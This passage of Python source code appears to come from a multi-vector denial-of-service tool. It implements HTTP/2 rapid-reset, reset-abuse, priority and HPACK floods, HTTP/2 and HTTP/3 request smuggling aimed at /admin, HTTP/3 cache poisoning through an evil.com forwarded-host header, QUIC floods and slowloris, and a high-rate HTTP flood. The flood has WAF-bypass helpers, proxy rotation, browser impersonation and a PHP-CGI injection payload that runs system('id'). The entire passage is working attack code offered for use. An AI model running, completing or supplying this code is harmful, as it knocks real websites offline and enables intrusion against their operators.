            if sem: await sem.acquire()
            sock = None
            try:
                ctx = self._ctx()
                raw_sock = socket.create_connection((self.host, self.port), timeout=10)
                sock = ctx.wrap_socket(raw_sock, server_hostname=self.original_host)
                neg = sock.selected_alpn_protocol()
                async with self.lock: self.conn_attempts += 1
                if neg != "h2" and not self.args.force_h2:
                    async with self.lock:
                        self.alpn_failures += 1; self.last_error = f"ALPN={neg}"
                    try: sock.close()
                    except Exception: pass
                    await asyncio.sleep(0.5); continue
                sock.sendall(PREF)
                sock.sendall(self._frame(0x4, 0, 0, self._settings([(0x4, 0)])))
                sock.sendall(self._frame(0x1, 0x4, 1, self._bomb(16000)))
                async with self.lock:
                    self.bombs_sent += 1; self.memory_amplified += 16000 * 5700
                sock.sendall(self._wu(0, 0))
                start = time.monotonic()
                while not self.stop_event.is_set() and not self.thread_stop.is_set():
                    if time.monotonic() - start > 30: break
                    try: sock.sendall(self._wu(0, 1))
                    except Exception: break
                    await asyncio.sleep(1.0)
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
            finally:
                if sock:
                    try: sock.close()
                    except Exception: pass
                if sem:
                    try: sem.release()
                    except Exception: pass

class PriorityFloodAttack(H2Base):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw); self.priority_frames = 0
    async def attack(self):
        if not H2_AVAILABLE: self.last_error = "no_h2_lib"; return
        if not H2_PATCHED:
            self.last_error = "h2<4.4 (no prioritize)"; logger.warning("PRIORITY - skipped (h2 < 4.4)"); return
        r, w = await self._open_h2()
        if r is None and not self.args.force_h2:
            logger.warning("PRIORITY - skipped (no h2 ALPN)"); return
        if w:
            w.close()
            try: await w.wait_closed()
            except Exception: pass
        logger.info("PRIORITY - active")
        workers = min(15, max(3, (self.args.workers or 200) // 30))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                async with self.lock: self.attempts += 1
                r, w = await self._open_h2()
                if r is None: continue
                cfg = h2.config.H2Configuration(client_side=True)
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection()
                w.write(conn.data_to_send()); await w.drain()
                streams = list(range(1, 200, 2))
                for i, sid in enumerate(streams):
                    try:
                        conn.prioritize(stream_id=sid, depends_on=streams[(i+1)%len(streams)], weight=256, exclusive=True)
                        async with self.lock: self.priority_frames += 1
                    except Exception: break
                w.write(conn.data_to_send()); await w.drain()
                await asyncio.sleep(random.uniform(1, 3))
                w.close()
                try: await w.wait_closed()
                except Exception: pass
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

class MadeYouResetAttack(H2Base):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw); self.resets_triggered = 0
    async def attack(self):
        if not H2_AVAILABLE: self.last_error = "no_h2_lib"; return
        r, w = await self._open_h2()
        if r is None and not self.args.force_h2:
            logger.warning("MadeYouReset - skipped (no h2 ALPN)"); return
        if w:
            w.close()
            try: await w.wait_closed()
            except Exception: pass
        logger.info("MadeYouReset - active")
        workers = min(15, max(3, (self.args.workers or 200) // 30))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                async with self.lock: self.attempts += 1
                r, w = await self._open_h2()
                if r is None: continue
                cfg = h2.config.H2Configuration(client_side=True)
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection()
                w.write(conn.data_to_send()); await w.drain()
                for i in range(50):
                    if self.stop_event.is_set(): break
                    try:
                        sid = conn.get_next_available_stream_id()
                        conn.send_headers(sid, [(":method", "GET"), (":path", f"/myr_{i}"), (":scheme", "https"), (":authority", self.original_host)], end_stream=False)
                        w.write(struct.pack(">I", 4)[1:] + b"\x03\x00" + struct.pack(">I", sid & 0x7fffffff) + struct.pack(">I", 0xffffffff))
                        async with self.lock: self.resets_triggered += 1
                    except Exception: break
                w.write(conn.data_to_send()); await w.drain()
                w.close()
                try: await w.wait_closed()
                except Exception: pass
                await asyncio.sleep(random.uniform(0.001, 0.005))
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

class HTTP2RapidResetAttack(H2Base):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw); self.streams = 0
    async def attack(self):
        if not H2_AVAILABLE: self.last_error = "no_h2_lib"; return
        r, w = await self._open_h2()
        if r is None and not self.args.force_h2:
            logger.warning("H2 Rapid Reset - skipped (no h2 ALPN)"); return
        if w:
            w.close()
            try: await w.wait_closed()
            except Exception: pass
        logger.info("H2 Rapid Reset - active")
        workers = min(15, max(3, (self.args.workers or 200) // 30))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                async with self.lock: self.attempts += 1
                r, w = await self._open_h2()
                if r is None: continue
                cfg = h2.config.H2Configuration(client_side=True)
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection()
                w.write(conn.data_to_send()); await w.drain()
                for i in range(50):
                    if self.stop_event.is_set(): break
                    sid = conn.get_next_available_stream_id()
                    conn.send_headers(sid, [(":method", "GET"), (":path", f"/r{i}"), (":scheme", "https"), (":authority", self.original_host)], end_stream=True)
                    conn.reset_stream(sid, error_code=0x08)
                    async with self.lock: self.streams += 1
                w.write(conn.data_to_send()); await w.drain()
                w.close()
                try: await w.wait_closed()
                except Exception: pass
                await asyncio.sleep(0.001)
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

class H2SmugglingAttack(H2Base):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw); self.smuggled = 0
    async def attack(self):
        if not H2_AVAILABLE: self.last_error = "no_h2_lib"; return
        r, w = await self._open_h2()
        if r is None and not self.args.force_h2:
            logger.warning("H2 Smuggle - skipped (no h2 ALPN)"); return
        if w:
            w.close()
            try: await w.wait_closed()
            except Exception: pass
        logger.info("H2 Smuggle - active")
        workers = min(8, max(2, (self.args.workers or 200) // 50))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                async with self.lock: self.attempts += 1
                r, w = await self._open_h2()
                if r is None: continue
                cfg = h2.config.H2Configuration(client_side=True, validate_outbound_headers=False, normalize_outbound_headers=False)
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection()
                w.write(conn.data_to_send()); await w.drain()
                body = (f"GET /admin HTTP/1.1\r\nHost: {self.original_host}\r\n\r\n").encode()
                sid = conn.get_next_available_stream_id()
                conn.send_headers(sid, [(":method", "POST"), (":path", "/"), (":scheme", "https"),
                                        (":authority", self.original_host),
                                        ("host", self.original_host), ("host", "internal.admin.local")], end_stream=False)
                conn.send_data(sid, body, end_stream=True)
                w.write(conn.data_to_send()); await w.drain()
                async with self.lock: self.smuggled += 1
                w.close()
                try: await w.wait_closed()
                except Exception: pass
                await asyncio.sleep(random.uniform(0.01, 0.05))
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

class GRPCCancellationChurnAttack(H2Base):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw); self.churns = 0
    async def attack(self):
        if not H2_AVAILABLE: self.last_error = "no_h2_lib"; return
        r, w = await self._open_h2()
        if r is None and not self.args.force_h2:
            logger.warning("gRPC Churn - skipped (no h2 ALPN)"); return
        if w:
            w.close()
            try: await w.wait_closed()
            except Exception: pass
        logger.info("gRPC Churn - active")
        workers = min(15, max(3, (self.args.workers or 200) // 30))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                async with self.lock: self.attempts += 1
                r, w = await self._open_h2()
                if r is None: continue
                cfg = h2.config.H2Configuration(client_side=True)
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection()
                w.write(conn.data_to_send()); await w.drain()
                for i in range(200):
                    if self.stop_event.is_set(): break
                    try:
                        sid = conn.get_next_available_stream_id()
                        conn.send_headers(sid, [(":method", "POST"), (":path", "/grpc.channelz.v1.Channelz/GetServers"),
                                                (":scheme", "https"), (":authority", self.original_host),
                                                ("content-type", "application/grpc"), ("te", "trailers")], end_stream=False)
                        conn.send_data(sid, b"\x00\x00\x00\x00\x00", end_stream=False)
                        w.write(struct.pack(">I", 4)[1:] + b"\x08\x00" + struct.pack(">I", sid & 0x7fffffff) + struct.pack(">I", 0))
                        w.write(struct.pack(">I", 4)[1:] + b"\x03\x00" + struct.pack(">I", sid & 0x7fffffff) + struct.pack(">I", 0x08))
                        async with self.lock: self.churns += 1
                    except Exception: break
                w.write(conn.data_to_send()); await w.drain()
                await asyncio.sleep(random.uniform(0.3, 1.0))
                w.close()
                try: await w.wait_closed()
                except Exception: pass
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

# ============================================================================
# H3 / QUIC — v65.1
# ============================================================================
if AIOQUIC_AVAILABLE:
    class H3Protocol(QuicConnectionProtocol):
        def __init__(self, *a, **kw):
            super().__init__(*a, **kw)
            self._http = H3Connection(self._quic)
        def send_headers_only(self, headers, data=b""):
            sid = self._quic.get_next_available_stream_id()
            if sid % 4 != 0: return
            if stream_is_unidirectional is not None and stream_is_unidirectional(sid): return
            self._http.send_headers(sid, headers, end_stream=not data)
            if data: self._http.send_data(sid, data, end_stream=True)
            self.transmit()
        def send_cache_poison_headers(self, authority, path=b"/"):
            headers = [
                (b":method", b"GET"), (b":path", path), (b":scheme", b"https"),
                (b":authority", authority.encode()),
                (b"x-forwarded-host", b"evil.com"),
                (b"x-original-url", b"/admin"),
                (b"x-rewrite-url", b"/admin"),
            ]
            self.send_headers_only(headers)
else:
    class H3Protocol:
        def __init__(self, *a, **kw): pass
        def send_headers_only(self, headers, data=b""): pass
        def send_cache_poison_headers(self, authority, path=b"/"): pass
        def transmit(self): pass

class QUICLeakAttack:
    def __init__(self, target, port, stop_event, thread_stop, args, original_host=None, rate_limiter=None, global_sem=None):
        self.target = target; self.port = port
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args
        self.rate_limiter = rate_limiter; self.global_sem = global_sem
        self.packets_sent = 0; self.attempts = 0; self.errors = 0; self.last_error = ""
        self.quic_available = False; self.probe_done = False
        self.lock = asyncio.Lock()
    async def _probe_quic(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2.0)
            for _ in range(3):
                dcid = os.urandom(8); scid = os.urandom(8)
                pkt = b"\xc0\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid
                pkt += b"\x00\x00\x00\x01\xff\x00\x00\x1d"
                pkt += os.urandom(max(0, 1200 - len(pkt)))
                sock.sendto(pkt, (self.target, self.port))
            try:
                data, addr = sock.recvfrom(1500)
                sock.close(); return len(data) > 40 and (data[0] & 0x80)
            except socket.timeout:
                sock.close(); return False
        except Exception:
            return False
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        if not self.quic_available and not self.args.force_quic:
            self.last_error = "no_quic"; logger.warning("QUIC-LEAK - QUIC not available on target"); return
        logger.info("QUIC-LEAK - active (QUIC confirmed)")
        workers = min(20, max(4, (self.args.workers or 200) // 15))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    def _build_quic_initial(self, dcid, scid):
        header = b"\xc0\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid + b"\x00"
        payload_len = max(0, 1200 - len(header) - 2)
        payload = os.urandom(payload_len)
        return header + struct.pack(">H", len(payload)) + payload
    async def _worker(self):
        scid = os.urandom(8); valid_dcid = os.urandom(8)
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            if self.rate_limiter: await self.rate_limiter.acquire(1)
            sem = self.global_sem
            if sem: await sem.acquire()
            sock = None
            try:
                pkts = [self._build_quic_initial(valid_dcid, scid)]
                for _ in range(14): pkts.append(self._build_quic_initial(os.urandom(8), scid))
                dg = b"".join(pkts)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setblocking(True); sock.settimeout(2.0)
                sock.sendto(dg, (self.target, self.port))
                async with self.lock:
                    self.packets_sent += 1; self.attempts += 1
                await asyncio.sleep(random.uniform(0.001, 0.005))
            except Exception as e:
                async with self.lock:
                    self.attempts += 1; self.errors += 1; self.last_error = str(e)[:60]
            finally:
                if sock:
                    try: sock.close()
                    except Exception: pass
                if sem:
                    try: sem.release()
                    except Exception: pass

class H3QPACKExpansionAttack:
    def __init__(self, host, port, stop_event, thread_stop, args, original_host=None, global_sem=None):
        self.host = host; self.port = port
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.original_host = original_host or host
        self.global_sem = global_sem
        self.headers_sent = 0; self.conn_attempts = 0; self.conn_failures = 0; self.last_error = ""
        self.lock = asyncio.Lock()
    async def attack(self):
        if not AIOQUIC_AVAILABLE: self.last_error = "no_aioquic"; return
        logger.info("H3 QPACK - active")
        workers = min(10, max(2, (self.args.workers or 200) // 50))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                # v65.1: استفاده از h3-29 و h3
                cfg = QuicConfiguration(is_client=True, alpn_protocols=["h3-29", "h3"])
                cfg.verify_mode = ssl.CERT_NONE
                cfg.max_datagram_size = 1350
                cfg.idle_timeout = 10.0
                async with self.lock: self.conn_attempts += 1
                async with connect(self.host, self.port, configuration=cfg, create_protocol=H3Protocol) as c:
                    for i in range(20):
                        if self.stop_event.is_set(): break
                        try:
                            headers = [(b":method", b"GET"), (b":path", f"/q{i}".encode()),
                                       (b":scheme", b"https"), (b":authority", self.original_host.encode())]
                            for j in range(500): headers.append((f"x-q-{i}-{j}".encode(), b"A" * random.randint(500, 2000)))
                            c.send_headers_only(headers)
                            async with self.lock: self.headers_sent += 1
                        except Exception: break
                    await asyncio.sleep(random.uniform(1, 3))
            except Exception as e:
                async with self.lock:
                    self.conn_failures += 1; self.last_error = str(e)[:60]
                await asyncio.sleep(0.5)
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

class CDNTsunamiAttack:
    def __init__(self, host, port, stop_event, thread_stop, args, original_host=None, global_sem=None):
        self.host = host; self.port = port
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.original_host = original_host or host
        self.global_sem = global_sem
        self.streams_sent = 0; self.conn_attempts = 0; self.conn_failures = 0; self.last_error = ""
        self.lock = asyncio.Lock()
    async def attack(self):
        if not AIOQUIC_AVAILABLE: self.last_error = "no_aioquic"; return
        logger.info("CDN Tsunami - active")
        workers = min(8, max(2, (self.args.workers or 200) // 50))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                cfg = QuicConfiguration(is_client=True, alpn_protocols=["h3-29", "h3"])
                cfg.verify_mode = ssl.CERT_NONE
                cfg.max_datagram_size = 1350
                cfg.idle_timeout = 10.0
                async with self.lock: self.conn_attempts += 1
                async with connect(self.host, self.port, configuration=cfg, create_protocol=H3Protocol) as c:
                    for i in range(50):
                        if self.stop_event.is_set(): break
                        try:
                            headers = [(b":method", b"GET"), (b":path", f"/t{i}".encode()),
                                       (b":scheme", b"https"), (b":authority", self.original_host.encode())]
                            for j in range(30): headers.append((f"x-t-{j}".encode(), b"A" * random.randint(200, 800)))
                            c.send_headers_only(headers)
                            async with self.lock: self.streams_sent += 1
                        except Exception: break
                    await asyncio.sleep(random.uniform(1, 3))
            except Exception as e:
                async with self.lock:
                    self.conn_failures += 1; self.last_error = str(e)[:60]
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

class QUICLORISAttack:
    def __init__(self, host, port, stop_event, thread_stop, args, rate_limiter=None):
        self.host = host; self.port = port
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args
        self.active_connections = 0; self.total_connections = 0; self.attempts = 0
        self.last_error = ""; self.error_count = 0
        self.lock = asyncio.Lock()
    async def attack(self):
        logger.info("QUICLORIS - active")
        workers = min(20, max(5, (self.args.workers or 200) // 15))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            try:
                async with self.lock: self.attempts += 1
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setblocking(False)
                dcid = os.urandom(8); scid = os.urandom(8)
                p = b"\xc0\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid + b"\x00" + struct.pack(">H", 1200) + os.urandom(1100)
                sent = False
                for _ in range(3):
                    try: sock.sendto(p, (self.host, self.port)); sent = True; break
                    except BlockingIOError: await asyncio.sleep(0.01)
                    except OSError: break
                if not sent: sock.close(); continue
                async with self.lock:
                    self.active_connections += 1; self.total_connections += 1
                while not self.stop_event.is_set() and not self.thread_stop.is_set():
                    try:
                        try:
                            while True: sock.recvfrom(65535)
                        except BlockingIOError: pass
                        except OSError: break
                        s = b"\xc0\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid + b"\x00" + struct.pack(">H", 50) + os.urandom(40)
                        try: sock.sendto(s, (self.host, self.port))
                        except BlockingIOError: pass
                        await asyncio.sleep(random.uniform(10, 30))
                    except Exception: break
                sock.close()
                async with self.lock:
                    if self.active_connections > 0: self.active_connections -= 1
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
                await asyncio.sleep(0.1)

class H3SmugglingAttack:
    def __init__(self, host, port, stop_event, thread_stop, args, original_host=None, global_sem=None):
        self.host = host; self.port = port
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.original_host = original_host or host
        self.global_sem = global_sem
        self.smuggled = 0; self.attempts = 0; self.conn_failures = 0; self.last_error = ""
        self.lock = asyncio.Lock()
    async def attack(self):
        if not AIOQUIC_AVAILABLE: self.last_error = "no_aioquic"; return
        logger.info("H3 Smuggling - active (CVE-2026-33555)")
        workers = min(8, max(2, (self.args.workers or 200) // 50))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                cfg = QuicConfiguration(is_client=True, alpn_protocols=["h3-29", "h3"])
                cfg.verify_mode = ssl.CERT_NONE
                cfg.max_datagram_size = 1350
                cfg.idle_timeout = 10.0
                async with self.lock: self.attempts += 1
                async with connect(self.host, self.port, configuration=cfg, create_protocol=H3Protocol) as c:
                    # v65.1: content-length صحیح + method POST
                    headers = [(b":method", b"POST"), (b":path", b"/"), (b":scheme", b"https"),
                               (b":authority", self.original_host.encode()), (b"content-length", b"100000")]
                    c.send_headers_only(headers, data=b"")
                    async with self.lock: self.smuggled += 1
                    await asyncio.sleep(random.uniform(0.1, 0.5))
            except Exception as e:
                async with self.lock:
                    self.conn_failures += 1; self.last_error = str(e)[:60]
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

class H3CachePoisoningAttack:
    def __init__(self, host, port, stop_event, thread_stop, args, original_host=None, global_sem=None):
        self.host = host; self.port = port
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.original_host = original_host or host
        self.global_sem = global_sem
        self.poisoned = 0; self.attempts = 0; self.conn_failures = 0; self.last_error = ""
        self.lock = asyncio.Lock()
    async def attack(self):
        if not AIOQUIC_AVAILABLE: self.last_error = "no_aioquic"; return
        logger.info("H3 Cache Poisoning - active")
        workers = min(8, max(2, (self.args.workers or 200) // 50))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                cfg = QuicConfiguration(is_client=True, alpn_protocols=["h3-29", "h3"])
                cfg.verify_mode = ssl.CERT_NONE
                cfg.max_datagram_size = 1350
                cfg.idle_timeout = 10.0
                async with self.lock: self.attempts += 1
                async with connect(self.host, self.port, configuration=cfg, create_protocol=H3Protocol) as c:
                    c.send_cache_poison_headers(self.original_host, f"/{os.urandom(4).hex()}".encode())
                    async with self.lock: self.poisoned += 1
                    await asyncio.sleep(random.uniform(0.1, 0.5))
            except Exception as e:
                async with self.lock:
                    self.conn_failures += 1; self.last_error = str(e)[:60]
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

# ============================================================================
# HTTP FLOOD — v65.1 (adaptive + resource gate + Brotli)
# ============================================================================
class MethodSelector:
    WEIGHTS = {
        "GET": 0.14, "POST": 0.08, "PUT": 0.04, "PATCH": 0.03,
        "DELETE": 0.03, "HEAD": 0.04, "OPTIONS": 0.02, "TRACE": 0.015,
        "CONNECT": 0.015, "RHEX": 0.04, "NULL": 0.03, "BOT": 0.03,
        "COOKIE": 0.03, "PPS": 0.02, "STRESS": 0.03, "DOWNLOADER": 0.02,
        "SLOW": 0.02, "XMLRPC": 0.03, "APACHE": 0.02, "TOR": 0.015,
        "BOMB": 0.02, "HULK": 0.05, "GOLDEN": 0.05,
        "BROTLI": 0.02, "LAND": 0.02, "JUMBO": 0.02,
    }
    @classmethod
    def pick(cls):
        n = list(cls.WEIGHTS.keys()); w = list(cls.WEIGHTS.values())
        return random.choices(n, weights=w, k=1)[0]

class HTTPFloodAttack:
    def __init__(self, target_url, workers, proxy_mgr, ua_gen, hdr_mgr, path_mgr,
                 stop_event, thread_stop, args, rate_limiter=None, net_monitor=None,
                 browser_cookies=None, browser_headers=None, original_host=None,
                 origin_ip=None, origin_port=None, cf_session=None, identity_rotator=None,
                 adaptive_limiter=None, litespeed_mode=False, brute=False,
                 adaptive_controller=None, resource_monitor=None, net_health=None):
        self.target_url = target_url
        self.workers = min(workers, args.max_workers)
        self.requests_sent = 0; self.curl_errors = 0; self.timeouts = 0
        self.attempts = 0; self.last_error = ""; self.error_count = 0
        self.error_types = Counter(); self.method_counts = Counter()
        self.lock = threading.Lock()
        self.proxy_mgr = proxy_mgr; self.ua_gen = ua_gen; self.hdr_mgr = hdr_mgr
        self.path_mgr = path_mgr
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.rate_limiter = rate_limiter
        self.adaptive_limiter = adaptive_limiter
        self.adaptive_controller = adaptive_controller
        self.resource_monitor = resource_monitor
        self.net_health = net_health
        self.browser_cookies = browser_cookies or []
        self.browser_headers = browser_headers or {}
        self.original_host = original_host
        self.origin_ip = origin_ip; self.origin_port = origin_port or 443
        self.method_selector = MethodSelector()
        self.cf_session = cf_session
        self.identity_rotator = identity_rotator or IdentityRotator(rotate_every=1)
        self.ua_gen_local = FastUAGenerator()
        self.identity_gen = PerRequestIdentity(self.ua_gen_local)
        self._thread_local = threading.local()
        self.litespeed_mode = litespeed_mode
        self.brute = brute
        if brute:
            self.delay_min = 0.0; self.delay_max = 0.0
        else:
            self.delay_min = getattr(args, "delay_min", 0.0)
            self.delay_max = getattr(args, "delay_max", 0.05)
        self.request_base = self.target_url
        if litespeed_mode:
            n_threads = min(50, max(10, self.workers // 30))
        else:
            n_threads = min(200, max(30, self.workers // 15))
        self._n_threads = n_threads
        self.adaptive_executor = AdaptiveThreadPoolExecutor(
            initial_workers=n_threads, min_workers=10, max_workers=200,
            thread_name_prefix="http_flood"
        )
        if self.adaptive_controller:
            self.adaptive_controller.set_worker_callback(self._on_workers_changed)
        self._session_pool = []
        self.browser_cookie_str = None
        if self.browser_cookies:
            self.browser_cookie_str = "; ".join(f"{c['name']}={c['value']}" for c in self.browser_cookies if isinstance(c, dict))

    def _on_workers_changed(self, new_workers):
        target_threads = max(10, min(200, new_workers // 15))
        self.adaptive_executor.set_target(target_threads)
        with self.lock:
            self._n_threads = target_threads

    def _create_session(self, imp):
        fp = get_extra_fp_dict(imp)
        kwargs = {"impersonate": imp}
        if fp: kwargs["extra_fp"] = fp
        try: s = curl_requests.Session(**kwargs)
        except Exception:
            try: s = curl_requests.Session(impersonate=imp)
            except Exception: s = curl_requests.Session()
        try: s.curl.setopt(CurlOpt.HTTP2_PSEUDO_HEADERS_ORDER, "masp")
        except Exception: pass
        try: s.curl.setopt(CurlOpt.HTTP2_SETTINGS, CHROME_133_SETTINGS)
        except Exception: pass
        try: s.curl.setopt(CurlOpt.HTTP2_WINDOW_UPDATE, int(CHROME_133_WINDOW_UPDATE))
        except Exception: pass
        if self.origin_ip and self.original_host and self.origin_port:
            try:
                s.curl.setopt(CurlOpt.RESOLVE, [f"{self.original_host}:{self.origin_port}:{self.origin_ip}"])
                s.curl.setopt(CurlOpt.SSL_VERIFYHOST, 0)
                s.curl.setopt(CurlOpt.SSL_VERIFYPEER, 0)
            except Exception: pass
        try:
            s.curl.setopt(CurlOpt.LOW_SPEED_LIMIT, 1)
            s.curl.setopt(CurlOpt.LOW_SPEED_TIME, 15)
        except Exception: pass
        return s

    def _build(self):
        method = WAFBypassEngine.random_method() if random.random() < 0.3 else self.method_selector.pick()
        base = self.request_base
        extra, body = {}, None
        if method == "POST":
            url = self.path_mgr.get(base)
            body = ("x=" + "x" * random.choice([64, 256, 1024, 4096])).encode()
            extra["Content-Type"] = "application/x-www-form-urlencoded"
        elif method == "PUT":
            url = self.path_mgr.get(base)
            body = os.urandom(random.choice([128, 512, 2048]))
            extra["Content-Type"] = "application/octet-stream"
        elif method == "PATCH":
            url = self.path_mgr.get(base)
            body = os.urandom(random.choice([64, 256]))
            extra["Content-Type"] = "application/json"
        elif method == "RHEX": url = urljoin(base, f"/{os.urandom(8).hex()}")
        elif method == "NULL": url = self.path_mgr.get(base); extra["__null__"] = "1"
        elif method == "BOT": url = self.path_mgr.get(base); extra["__bot__"] = "1"
        elif method == "COOKIE": url = self.path_mgr.get(base); extra["Cookie"] = f"PHPSESSID={os.urandom(16).hex()}"
        elif method == "STRESS":
            url = self.path_mgr.get(base)
            body = os.urandom(random.choice([1024, 4096, 16384]))
            extra["Content-Type"] = "application/octet-stream"
        elif method == "DOWNLOADER": url = self.path_mgr.get(base); extra["Range"] = f"bytes=0-{random.randint(1000000, 50000000)}"
        elif method == "SLOW": url = self.path_mgr.get(base); extra["Content-Length"] = str(random.randint(1000000, 10000000))
        elif method == "XMLRPC":
            url = urljoin(base, "/xmlrpc.php")
            body = b"<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>"
            extra["Content-Type"] = "text/xml"
        elif method == "APACHE":
            url = urljoin(base, "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input")
            body = b"<?php system('id'); ?>"
            extra["Content-Type"] = "application/x-www-form-urlencoded"
        elif method == "TOR": url = base; extra["__min__"] = "1"
        elif method == "BOMB":
            url = self.path_mgr.get(base)
            body = os.urandom(random.choice([32768, 65536, 131072, 262144]))
            extra["Content-Type"] = "application/octet-stream"
        elif method == "HULK": url = base + f"/?{os.urandom(8).hex()}"; extra["__hulk__"] = "1"
        elif method == "GOLDEN": url = base + f"/{os.urandom(8).hex()}"; extra["__golden__"] = "1"
        elif method == "BROTLI":
            url = self.path_mgr.get(base)
            # v65.1: Brotli bomb واقعی
            try:
                import brotli
                raw = os.urandom(1024)  # داده تصادفی
                body = brotli.compress(raw, quality=11)  # فشردهسازی حداکثری
            except ImportError:
                body = b"\x00" * 65536  # fallback
            extra["Content-Encoding"] = "br"
            extra["Content-Type"] = "application/octet-stream"
            extra["__brotli__"] = "1"
        elif method == "LAND": url = base; extra["__land__"] = "1"
        elif method == "JUMBO":
            url = self.path_mgr.get(base)
            body = b"X" * 9000
            extra["Content-Type"] = "application/octet-stream"
            extra["__jumbo__"] = "1"
        else: url = self.path_mgr.get(base)
        return method, url, extra, body

    def _do_one(self, session, imp):
        proxy = None
        with self.lock: self.attempts += 1
        try:
            if not self.args.no_proxy and self.proxy_mgr:
                proxy = self.proxy_mgr.get()
            method, url, extra, body = self._build()
            identity = self.identity_gen.generate(self.original_host)
            ua = identity["user_agent"]
            headers = identity["headers"]
            for k, v in identity["sec_ch_ua"].items(): headers[k] = v
            headers["Referer"] = identity["referer"]
            headers = WAFBypassEngine.align_headers(ua, identity["sec_ch_ua"], headers)
            extra = WAFBypassEngine.apply_method_tampering(method, extra)
            extra = WAFBypassEngine.apply_encoding_variation(extra, body)
            for k, v in extra.items():
                if k.startswith("__"): continue
                headers[k] = v
            if extra.get("__bot__"): headers["User-Agent"] = random.choice(GOOGLEBOT_AGENTS)
